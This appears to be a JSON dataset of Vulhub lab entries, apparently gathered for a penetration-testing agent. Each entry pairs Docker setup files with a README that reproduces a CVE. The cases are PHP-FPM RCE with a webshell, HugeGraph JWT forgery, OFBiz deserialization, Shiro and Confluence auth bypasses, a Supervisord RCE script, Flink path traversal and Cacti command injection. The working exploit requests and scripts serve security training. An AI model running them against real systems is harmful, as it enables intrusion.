exploited using the tool from https://github.com/neex/phuip-fpizdam:\n\n```\n$ go run . \"http://your-ip:8080/index.php\"\n2019/10/23 19:41:00 Base status code is 200\n2019/10/23 19:41:00 Status code 502 for qsl=1795, adding as a candidate\n2019/10/23 19:41:00 The target is probably vulnerable. Possible QSLs: [1785 1790 1795]\n2019/10/23 19:41:02 Attack params found: --qsl 1790 --pisos 152 --skip-detect\n2019/10/23 19:41:02 Trying to set \"session.auto_start=0\"...\n2019/10/23 19:41:02 Detect() returned attack params: --qsl 1790 --pisos 152 --skip-detect <-- REMEMBER THIS\n2019/10/23 19:41:02 Performing attack using php.ini settings...\n2019/10/23 19:41:02 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs\n2019/10/23 19:41:02 Trying to cleanup /tmp/a...\n2019/10/23 19:41:02 Done!\n```\n\nThe successful exploitation will be indicated by the output above:\n\n![](1.png)\n\nAfter the initial exploitation, a webshell is injected into the PHP-FPM process. You can execute commands by visiting:\n\n```\nhttp://your-ip:8080/index.php?a=id\n```\n\nExample of successful command execution:\n\n![](2.png)\n\n### Important Notes\n\n1. The vulnerability affects only some of the PHP-FPM child processes. If a command doesn't execute on the first try, make multiple attempts to reach an affected process.\n2. The success of the exploit depends heavily on the specific Nginx configuration. The most common vulnerable configuration includes:\n   - FastCGI processing enabled\n   - PHP files processed through PHP-FPM\n   - Specific location rules that split URLs in a vulnerable way\n"
  },
  {
    "filename": "CVE-2024-43441.md",
    "filenamenomd": "CVE-2024-43441",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/hugegraph/CVE-2024-43441/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/hugegraph/CVE-2024-43441/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 143 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/hugegraph:1.3.0\n    environment:\n      - PASSWORD=vulhub\n    ports:\n      - \"8080:8080\"\n      - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.\n\nA JWT token secret hardcoding vulnerability exists in Apache HugeGraph. When authentication is enabled but `auth.token_secret` is not configured, HugeGraph will use a hardcoded default JWT secret key with the value `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`. An attacker can use this default secret key to generate valid JWT tokens and bypass authentication to perform unauthorized operations.\n\nReferences:\n\n- <https://github.com/advisories/GHSA-f697-gm3h-xrf9>\n- <https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246>\n\n## Environment Setup\n\nExecute the following command to start a Apache HugeGraph 1.3.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can access the HugeGraph RESTful API at `http://your-ip:8080`.\n\nBy default, Apache HugeGraph supports two authentication modes: HTTP Basic Authentication and JWT Authentication. When starting the docker container, it will use the `PASSWORD` environment variable as the default administrator's password. Then you can access the API using HTTP Basic Authentication with the username \"admin\" and this password.\n\nIf you try to access the API without providing any authentication headers, you will receive the following error:\n\n```json\n{\n    \"exception\": \"class jakarta.ws.rs.NotAuthorizedException\",\n    \"message\": \"Authentication credentials are required\",\n    \"cause\": \"\"\n}\n```\n\n## Vulnerability Reproduce\n\nBesides the default administrator's password, we can also use the default JWT secret key to generate a valid JWT token and bypass the authentication.\n\nGenerate a JWT token using the default secret key:\n\n```python\n# Install the jwt library by running `pip install pyjwt`\nimport jwt\n\n# Generate JWT token using the default secret\ntoken = jwt.encode(\n    {\n      \"user_name\": \"admin\",\n      \"user_id\": \"-30:admin\",\n      \"exp\": 9739523483\n    },\n    \"FXQXbJtbCLxODc6tGci732pkH1cyf8Qg\",\n    algorithm=\"HS256\"\n)\nprint(f\"Generated JWT token: {token}\")\n# Output:\n# Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg\n```\n\nUse the generated token to access protected endpoints:\n\n```\nGET /graphs HTTP/1.1\nHost: localhost:8080\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg\n```\n\nYou will receive the following response:\n\n![](1.png)\n\nIf you remove the `Authorization` header, you will receive the following error:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2023-49070.md",
    "filenamenomd": "CVE-2023-49070",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2023-49070/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2023-49070/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:18.12.09\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Unsafe deserialization of XMLRPC arguments in Apache OFBiz (CVE-2023-49070)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nApahce OFBiz prior to 17.12.03, there is a deserialization issue caused by XMLRPC endpoint at `/webtools/control/xmlrpc`, which is marked as [CVE-2020-9496](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496). Developer fixed this issue by adding authentication check and filter, but the patches have been bypassed by CVE-2023-49070.\n\nApache OFBiz deleted XMLRPC interface to escape this nightmare at version 18.12.10 eventually.\n\nReferences:\n\n- <https://www.openwall.com/lists/oss-security/2023/12/04/2>\n- <https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496>\n\n## Vulnerable environment\n\nExecuting following command to start an Apache OfBiz 18.12.09 server:\n\n```\ndocker compose up -d\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\nThe method to reproduce CVE-2023-49070 is similar to [CVE-2020-9496](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496), except that it requires bypassing the patches.\n\nFirst of all, use [ysoserial](https://github.com/frohoff/ysoserial) to generate a CommonsBeanutils1 gadget payload:\n\n```\njava -jar ysoserial.jar CommonsBeanutils1 \"touch /tmp/success\" | base64 | tr -d \"\\n\"\n```\n\n![](1.png)\n\nSending packets using the method in CVE-2020-9496 no longer works:\n\n![](2.png)\n\nBut modifing the path to `/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y` is able to bypass the restriction:\n\n```\nPOST /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1\nHost: your-ip\nContent-Type: application/xml\nContent-Length: 4093\n\n<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>ProjectDiscovery</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>test</name>\n            <value>\n              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">[base64-payload]</serializable>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>\n```\n\n![](3.png)\n\n`touch /tmp/success` has been executed in the container:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2020-1957.md",
    "filenamenomd": "CVE-2020-1957",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2020-1957/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2020-1957/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/shiro:1.5.1\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.\n\nIn versions of Apache Shiro prior to 1.5.2 with the Spring dynamic controller, an attacker can construct a maliciously crafted request using `..;` to bypass the directory authentication.\n\nReference links:\n\n- <https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139>\n- <https://xz.aliyun.com/t/8281>\n- <https://blog.spoock.com/2020/05/09/cve-2020-1957/>\n\n## Vulnerability environment\n\nStart an application with Spring 2.2.2 and Shiro 1.5.1 by executing the following command.\n\n```\ndocker compose up -d\n```\n\nOnce the environment is started, visit ``http://your-ip:8080`` to see the home page.\n\nThe configuration of URL permissions in this application is as follows.\n\n``` java\n@Bean\npublic ShiroFilterChainDefinition shiroFilterChainDefinition() {\n    DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();\n    chainDefinition.addPathDefinition(\"/login.html\", \"authc\"); // need to accept POSTs from the login form\n    chainDefinition.addPathDefinition(\"/logout\", \"logout\");\n    chainDefinition.addPathDefinition(\"/admin/**\", \"authc\");\n    return chainDefinition;\n}\n```\n\n## Exploit\n\nA direct request to the admin page `/admin/` is inaccessible and will be redirected to the login page.\n\n![](1.png)\n\nConstruct a malicious request `/xxx/..;/admin/` to bypass authentication checks and access the admin page.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-11610.md",
    "filenamenomd": "CVE-2017-11610",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/Dockerfile\n- /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/docker-entrypoint.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 491 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\nimport xmlrpc.client\nimport sys\n\n\ntarget = sys.argv[1]\ncommand = sys.argv[2]\nwith xmlrpc.client.ServerProxy(target) as proxy:\n    old = getattr(proxy, 'supervisor.readLog')(0,0)\n\n    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()\n    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))\n    result = getattr(proxy, 'supervisor.readLog')(0,0)\n\n    print(result[len(old):])\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 55 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   build: .\n   ports:\n    - \"9001:9001\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 497 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/python:2.7\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nCOPY docker-entrypoint.sh /usr/local/bin/\n\nRUN pip install -U pip \\\n    && pip install \"supervisor==3.3.2\" \\\n    && echo_supervisord_conf | tee /usr/local/etc/supervisord.conf \\\n    && { \\\n        echo \"[inet_http_server]\"; \\\n        echo \"port=0.0.0.0:9001\"; \\\n        echo; \\\n    } | tee -a /usr/local/etc/supervisord.conf \\\n    && chmod +x /usr/local/bin/docker-entrypoint.sh\n\nCMD [\"/usr/local/bin/docker-entrypoint.sh\"]\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/supervisor/CVE-2017-11610/docker-entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 105 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nsupervisord --user nobody -c /usr/local/etc/supervisord.conf\n\nwhile true; do sleep 30; done;\n```\n\n",
    "readme": "# Supervisord XML-RPC Remote Command Execution (CVE-2017-11610)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSupervisord is a process control system for Unix-like operating systems.\n\nIn the supervisor version before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3, a remote code execution vulnerability exists in its XML-RPC interface, which allows attackers to execute arbitrary commands through specially crafted XML-RPC requests.\n\nReferences:\n\n- https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html\n- https://blogs.securiteam.com/index.php/archives/3348\n- https://github.com/Supervisor/supervisor/commit/90c5df80777bfec03d041740465027f83d22e27b\n\n## Environment Setup\n\nExecute the following commands to start Supervisord 3.3.2:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Supervisord interface at `http://your-ip:9001`.\n\n## Vulnerability Reproduction\n\nSend the following request to the XML-RPC interface, and the command will be executed:\n\n```\nPOST /RPC2 HTTP/1.1\nHost: localhost\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 213\n\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n<params>\n<param>\n<string>touch /tmp/success</string>\n</param>\n</params>\n</methodCall>\n```\n\n![](01.png)\n\n### POC with Direct Output\n\n@Ricter proposed an effective approach on Weibo: write the command execution results to a log file, then use Supervisord's built-in readLog method to read the log file and retrieve the results.\n\nHere's a simple POC [poc.py](poc.py):\n\n```python\n#!/usr/bin/env python3\nimport xmlrpc.client\nimport sys\n\n\ntarget = sys.argv[1]\ncommand = sys.argv[2]\nwith xmlrpc.client.ServerProxy(target) as proxy:\n    old = getattr(proxy, 'supervisor.readLog')(0,0)\n\n    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()\n    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))\n    result = getattr(proxy, 'supervisor.readLog')(0,0)\n\n    print(result[len(old):])\n```\n\nExecute with Python3 to get the results: `./poc.py \"http://your-ip:9001/RPC2\" \"command\"`：\n\n![](02.png)\n"
  },
  {
    "filename": "CVE-2020-17519.md",
    "filenamenomd": "CVE-2020-17519",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/flink/CVE-2020-17519/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/flink/CVE-2020-17519/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 117 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n flink:\n   image: vulhub/flink:1.11.2\n   command: jobmanager\n   ports:\n    - \"8081:8081\"\n    - \"6123:6123\"\n\n```\n\n",
    "readme": "# Apache Flink `jobmanager/logs` Path Traversal (CVE-2020-17519)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.\n\nA vulnerability introduced in Apache Flink 1.11.0 (and present in versions 1.11.1 and 1.11.2) allows attackers to read arbitrary files from the local filesystem through the JobManager's REST interface. This path traversal vulnerability exists in the log viewing functionality.\n\nReferences:\n\n- <https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801>\n- <https://nvd.nist.gov/vuln/detail/CVE-2020-17519>\n\n## Environment Setup\n\nExecute the following command to start an Apache Flink jobmanager 1.11.2:\n\n```\ndocker compose up -d\n```\n\nAfter the Apache Flink service is started, visit `http://your-ip:8081` to access the management interface.\n\n## Vulnerability Reproduction\n\nAccess the following URL to read the contents of `/etc/passwd` file from the target server:\n\n```\nhttp://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2022-46169.md",
    "filenamenomd": "CVE-2022-46169",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2022-46169/entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2022-46169/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2022-46169/entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 648 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\nset -ex\n\nwait-for-it db:3306 -t 300 -- echo \"database is connected\"\nif [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then\n    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql\n    mysql --host=db --user=root --password=root cacti -e \"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'\"\n    mysql --host=db --user=root --password=root cacti -e \"SET GLOBAL time_zone = 'UTC'\"\nfi\n\nchown www-data:www-data -R /var/www/html\n# first arg is `-f` or `--some-option`\nif [ \"${1#-}\" != \"$1\" ]; then\n\tset -- apache2-foreground \"$@\"\nfi\n\nexec \"$@\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2022-46169/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 348 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/cacti:1.2.22\n    ports:\n     - \"8080:80\"\n    depends_on:\n     - db\n    entrypoint:\n     - bash\n     - /entrypoint.sh\n    volumes:\n     - ./entrypoint.sh:/entrypoint.sh\n    command: apache2-foreground\n  db:\n   image: mysql:5.7\n   environment:\n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=cacti\n\n```\n\n",
    "readme": "# Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nCacti is a robust and extensible operational monitoring and fault management framework for users around the world. A command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti prior from version 1.2.17 to 1.2.22, if a specific data source was selected for any monitored device.\n\nReferences:\n\n- <https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf>\n- <https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A>\n\n## Vulnerability Environment\n\nExecute following command to start a Cacti server 1.2.22:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you will see the login page at `http://localhost:8080`.\n\nThen login as admin/admin, follow the instructions to initialize the application. Actually, just click the \"next button\" again and again before you see the success page.\n\n![](1.png)\n\nBefore you can exploit this vulnerability, you have to add a new \"Graph\" because the command injection is occurred not in the default graph type:\n\n![](2.png)\n\nSelect the graph type \"Device - Uptime\", and click the \"Create\" button:\n\n![](3.png)\n\n## Exploit\n\nAfter complete the above initialization, you will change your role to a attacker. Just send following request to Cacti server to trigger the command injection attack:\n\n```\nGET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success` HTTP/1.1\nX-Forwarded-For: 127.0.0.1\nHost: localhost.lan\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n\n```\n\n![](4.png)\n\nAlthough no command result in the response, you can find the `/tmp/success` has been touched successfully.\n\n![](5.png)\n"
  },
  {
    "filename": "CVE-2023-22515.md",
    "filenamenomd": "CVE-2023-22515",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2023-22515/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2023-22515/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 241 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/confluence:8.5.1\n    ports:\n      - \"8090:8090\"\n    depends_on:\n      - db\n  db:\n    image: postgres:15.4-alpine\n    environment: \n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=confluence\n\n```\n\n",
    "readme": "# Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nConfluence is a web-based corporate wiki developed by Australian software company Atlassian.\n\nOn October 4, 2023, Atlassian published a security advisory on CVE-2023-22515, a critical vulnerability affecting on-premises instances of Confluence Server and Confluence Data Center. CVE-2023-22515 was originally announced as a privilege escalation vulnerability, but was later changed to a broken access control flaw.\n\nVersions prior to 8.0.0 are not affected by this vulnerability.\n\nReferences:\n\n- <https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html>\n- <https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis>\n\n## Vulnerable Environment\n\nExecute following command to start a Confluence Server 8.5.1:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit ``http://your-ip:8090`` and you will see the installation guide, select \"Trial installation\", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.\n\nFollowing [this guide](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396) to complete the installation.\n\nOn the database configuration page, fill in the form with database address `db`, database name `confluence`, username `postgres`, password `postgres`.\n\n![](1.png)\n\n## Exploit\n\nFirstly, send the main request to overwrite the attribute `bootstrapStatusProvider.applicationConfig.setupComplete`:\n\n```\nGET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1\nHost: localhost:8090\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\nConnection: close\nCache-Control: max-age=0\n\n\n```\n\nThen, you will be able to create a administrator user `vulhub` through the website setup action:\n\n```\nPOST /setup/setupadministrator.action HTTP/1.1\nHost: localhost:8090\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nX-Atlassian-Token: no-check\n\nusername=vulhub&fullName=vulhub&email=admin%40vulhub.org&password=vulhub&confirm=vulhub&setup-next-button=Next\n```\n\nOptionally, send the following request to finish the setup wizard:\n\n```\nPOST /setup/finishsetup.action HTTP/1.1\nHost: localhost:8090\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nX-Atlassian-Token: no-check\n\n\n```\n\nFinally, you can simply login to the administrator panel with account `vulhub` and password `vulhub`:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2010-3863.md",
    "filenamenomd": "CVE-2010-3863",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2010-3863/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/shiro/CVE-2010-3863/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/shiro:1.0.0\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.\n\nApache Shiro before 1.1.0, and JSecurity 0.9.x, does not canonicalize URI paths before comparing them to entries in the shiro.ini file, which allows remote attackers to bypass intended access restrictions via a crafted request, as demonstrated by the `/./`, `/../`, `/`, `//` URI.\n\nReferences:\n\n- <https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34>\n- <https://xz.aliyun.com/t/11633#toc-2>\n- <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863>\n\n## Vulnerable Environment\n\nStart an application with Spring and Shiro 1.0.0 by executing the following command.\n\n```\ndocker compose up -d\n```\n\nOnce the environment is started, visit ``http://your-ip:8080`` to see the home page.\n\n## Vulnerability Reproduce\n\nA direct request to the admin page `/admin` is inaccessible and will be redirected to the login page.\n\n![](1.png)\n\nConstruct a malicious request `/./admin` to bypass authentication checks and access the admin page.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-12794.md",
    "filenamenomd": "CVE-2017-12794",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/app.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/models.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/apps.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/__init__.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/migrations/0001_initial.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/migrations/__init__.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 302 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/django:1.11.4\n   volumes:\n    - .:/app\n   ports:\n    - \"8000:8000\"\n   depends_on:\n    - db \n   environment:\n    - DATABASE_URL=postgres://postgres:postgres@db:5432/postgres\n db:\n   image: postgres:9.6-alpine\n   environment:\n    - POSTGRES_PASSWORD=postgres\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/app.py\n\n- Extension: .py\n- Language: python\n- Size: 946 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\nimport os\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", __name__)\nimport sys\nimport dj_database_url\nfrom django.conf.urls import url\n\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nDEBUG = True\nSECRET_KEY = '__secret_key__'\nALLOWED_HOSTS = ['*']\n\nROOT_URLCONF = __name__\nTEMPLATES = [{\n    'BACKEND': 'django.template.backends.django.DjangoTemplates',\n    'DIRS': [os.path.join(BASE_DIR, 'templates')],\n}]\nDATABASES = {\n    'default': dj_database_url.config(default='sqlite:///%s' % os.path.join(BASE_DIR, 'db.sqlite3'))\n}\nINSTALLED_APPS = [\n   'xss'\n]\n\n\ndef user(request):\n    from django.http import HttpResponse\n    from xss.models import User\n    User.objects.create(username=request.GET['username'])\n    return HttpResponse('Hello, user has been created!')\n\n\nurlpatterns = [\n    url(r'^create_user/$', user)\n]\n\n\nfrom django.core.management import execute_from_command_line\nexecute_from_command_line(sys.argv)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/models.py\n\n- Extension: .py\n- Language: python\n- Size: 129 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nfrom django.db import models\n\n\nclass User(models.Model):\n    username = models.CharField('Username', unique=True, max_length=32)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2017-12794/xss/apps.py\n\n- Extension: .py\n- Language: python\n- Size: 81 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### 